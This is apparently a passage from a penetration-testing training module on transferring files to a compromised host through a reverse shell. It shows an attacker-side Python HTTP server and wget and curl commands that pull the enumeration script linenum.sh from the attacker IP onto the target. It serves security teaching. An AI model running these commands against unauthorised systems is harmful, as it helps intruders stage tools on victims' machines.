During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the `Upload` command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

## Using wget

There are many methods to accomplish this. One method is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and then using `wget` or `cURL` to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

Transferring Files

```shell-session
Iskandeur@htb[/htb]$ cd /tmp
Iskandeur@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

Transferring Files

```shell-session
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

Note that we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have `wget`, we can use `cURL` to download the file:

Transferring Files

```shell-session
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

Note that we used the `-o` flag to specify the output file name.
